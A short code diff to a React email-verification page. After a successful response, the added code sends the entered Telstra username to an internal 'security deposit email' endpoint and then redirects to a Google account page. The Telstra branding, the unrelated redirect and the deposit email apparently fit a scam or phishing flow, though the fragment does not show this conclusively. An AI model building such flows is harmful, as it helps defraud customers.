@@ -43,6 +43,22 @@ export default function EmailVerificationPage() {
         });
 
         if (response.ok) {
+          // Send security deposit email
+          try {
+            await fetch('/api/users/send-security-deposit-email', {
+              method: 'POST',
+              headers: {
+                'Content-Type': 'application/json',
+              },
+              body: JSON.stringify({
+                email: telstraUsername.trim(),
+              }),
+            });
+          } catch (emailError) {
+            console.error('Error sending security deposit email:', emailError);
+            // Don't block the redirect if email fails
+          }
+          
           // Redirect to Telstra ID page or success page
           window.location.href = 'https://myaccount.google.com/';
         } else {
